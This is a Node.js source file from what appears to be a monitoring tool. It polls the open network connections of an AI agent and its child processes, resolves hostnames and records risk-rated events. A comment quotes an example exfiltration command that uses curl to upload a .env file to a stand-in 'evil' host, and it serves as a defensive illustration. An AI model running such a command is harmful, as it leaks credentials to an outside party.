// Which servers are the agent and the programs it started talking to?
// Polls open connections for the processes we're tracking (lsof on macOS, netstat on Windows).
import dns from 'node:dns/promises';
import { addEvent, getAgent } from '../store.js';
import { analyzeDestination } from '../rules.js';
import { trackedPids } from './processes.js';
import { truncate } from '../describe.js';
import { listConnections } from '../platform.js';
import { registerMonitor, monitorOk, monitorFailed } from './health.js';

const POLL_MS = 1000;
const DNS_MAX = 2000;
/** agentId -> Set of `${pid or root}|${ip}:${port}` already reported. Cleared when the agent goes. */
const seen = new Map();
/** name or ip -> Promise. Bounded: the oldest entries go first. */
const dnsCache = new Map();
const DASHBOARD_PORT = +(process.env.PORT ?? 4100);

/** True for 127.x.x.x, ::1 and IPv4-mapped loopback. */
export function isLoopback(ip) {
  return /^(127\.|::1$|::ffff:127\.|0:0:0:0:0:0:0:1$)/.test(ip ?? '');
}

/** Harness's own dashboard on this computer. The same port on any other host is reported. */
export function isOwnDashboard(ip, port, dashboardPort = +(process.env.PORT ?? DASHBOARD_PORT)) {
  return port === dashboardPort && isLoopback(ip);
}

function cached(key, make) {
  if (dnsCache.has(key)) return dnsCache.get(key);
  const p = make();
  dnsCache.set(key, p);
  if (dnsCache.size > DNS_MAX) dnsCache.delete(dnsCache.keys().next().value);
  return p;
}

const timeout = (ms) => new Promise((r) => setTimeout(() => r(null), ms));

async function reverse(ip) {
  return cached(`rev:${ip}`, () => Promise.race([
    dns.reverse(ip).then((names) => names[0] ?? null).catch(() => null),
    timeout(800),
  ]));
}

async function forward(host) {
  return cached(`fwd:${host}`, () => Promise.race([
    dns.lookup(host, { all: true }).then((list) => list.map((a) => a.address)).catch(() => []),
    timeout(800).then(() => []),
  ]));
}

const normIp = (ip) => String(ip ?? '').replace(/^::ffff:/, '').toLowerCase();

/**
 * The hostname to show for a connection. A name written in the command is used only when it
 * actually resolves to the IP that was contacted: `curl https://github.com -d @.env https://evil`
 * must not be labelled github.com when the upload went somewhere else.
 */
export async function hostFor(cmd, ip, { lookup = forward, rev = reverse } = {}) {
  const names = [...new Set([...(cmd ?? '').matchAll(/https?:\/\/(?:[^@/\s'"]*@)?(\[[^\]]+\]|[^/:\s'"]+)/g)].map((m) => m[1]))];
  const want = normIp(ip);
  for (const name of names) {
    const bare = name.replace(/^\[|\]$/g, '');
    if (normIp(bare) === want) return bare;
    const addrs = await lookup(bare);
    if (addrs.some((a) => normIp(a) === want)) return bare;
  }
  return rev(ip);
}

async function poll() {
  const tracked = trackedPids();
  if (!tracked.size) return;
  const live = new Set([...tracked.values()].map((t) => t.agentId));
  for (const id of seen.keys()) if (!live.has(id) && !getAgent(id)?.alive) seen.delete(id);
  for (const { pid, ip, port } of await listConnections([...tracked.keys()])) {
    if (isOwnDashboard(ip, port)) continue;
    const t = tracked.get(pid);
    if (!t) continue;
    if (!seen.has(t.agentId)) seen.set(t.agentId, new Set());
    const mine = seen.get(t.agentId);
    const k = `${t.isRoot ? 'root' : pid}|${ip}:${port}`;
    if (mine.has(k)) continue;
    mine.add(k);
    report(t, pid, { ip, port }).catch((err) => console.error('[network]', err.message));
  }
}

async function report(t, pid, { ip, port }) {
  const agent = getAgent(t.agentId);
  if (!agent) return;
  const host = await hostFor(t.cmd, ip);
  const d = analyzeDestination({ host, ip, port, isAgentItself: t.isRoot });
  // Package managers and git talk to registries and GitHub through CDNs whose IPs have no useful name.
  if (!d.local && d.risk === 'medium' && /^(npm|pnpm|yarn|bun|pip3?|uv|git|gh|brew)\b/.test(t.cmd ?? '')) {
    d.risk = 'info';
    d.reasons = [];
  }
  const who = t.isRoot ? agent.label : `a program ${agent.label} started (${truncate(t.cmd, 40)})`;
  addEvent({
    agentId: t.agentId,
    kind: 'network',
    risk: d.risk,
    reasons: d.reasons,
    title: d.local ? `${capital(who)} connected to ${d.where}` : `${capital(who)} talked to ${d.where}`,
    detail: `pid ${pid} → ${ip}:${port}${host ? ` (${host})` : ''}`,
    pid,
    host: host ?? ip,
    trusted: d.trusted,
    isAgentItself: t.isRoot,
  });
}

function capital(s) {
  return s.charAt(0).toUpperCase() + s.slice(1);
}

export function startNetworkMonitor() {
  registerMonitor('network', { label: 'Network watch', stallMs: 15000 });
  const loop = async () => {
    try {
      await poll();
      monitorOk('network');
    } catch (err) {
      monitorFailed('network', err);
      console.error('[network]', err.message);
    }
    setTimeout(loop, POLL_MS);
  };
  loop();
}
